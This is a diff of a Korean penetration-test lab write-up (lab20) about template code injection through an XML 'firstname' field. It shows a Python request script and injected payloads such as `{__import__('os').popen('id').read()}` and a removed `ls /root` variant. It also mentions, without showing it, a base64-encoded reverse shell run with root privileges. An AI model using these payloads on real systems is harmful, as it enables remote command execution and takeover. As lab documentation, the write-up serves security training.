@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 - lab20
 created: 2026-11-17
-modified: 2026-11-19T20:23:15.502Z
+modified: 2026-11-19T20:28:23.024Z
 published: 2026-11-17
 date: 2026-11-17
 tags:
@@ -351,18 +351,12 @@ if __name__=="__main__":
 ![[00. Setting/00. 첨부파일/Pasted image 20261117151433.png]]
 ![[00. Setting/00. 첨부파일/Pasted image 20261117151715.png]]
 
-`xml` 형식을 짜고 요청을 보내는 python 코드를 만들어 실험 삼아 `firstname`의 내용을 `{1+1}`로 넣어본다.
-`Patient 2 User (M), 26 years old, recieved from Test at 20261117123000`
-이 최종 출력 됐다. `template`의 내용인 `1+1`이 계산 됐음을 알 수 있다.
-
-![[00. Setting/00. 첨부파일/Pasted image 20261117151947.png]]
-
 ```
 python3 - <<'PY'
 from urllib.request import Request, urlopen
 
 xml = """<patient>
-<firstname>{__import__('os').popen('ls /root').read()}</firstname>
+<firstname>{1+1}</firstname>
 <lastname>User</lastname>
 <sender_app>Test</sender_app>
 <timestamp>20261117123000</timestamp>
@@ -383,7 +377,17 @@ with urlopen(req) as response:
 PY
 ```
 
+`xml` 형식을 짜고 요청을 보내는 python 코드를 만들어 실험 삼아 `firstname`의 내용을 `{1+1}`로 넣어본다.
+`Patient 2 User (M), 26 years old, recieved from Test at 20261117123000`
+이 최종 출력 됐다. `template`의 내용인 `1+1`이 계산 됐음을 알 수 있다.
+
+![[00. Setting/00. 첨부파일/Pasted image 20261117151947.png]]
+
+`{__import__('os').popen('id').read()}`를 넣어보면 명령어가 실행됨을 알 수 있다. `root`의 권한으로 실행됐음을 확인했다.
+
 ![[00. Setting/00. 첨부파일/Pasted image 20261117171020.png]]
+
+리버스쉘을 `base64`로 인코딩해서 결과를 한 줄로 만든다.
 
 ![[00. Setting/00. 첨부파일/Pasted image 20261117170916.png]]
 
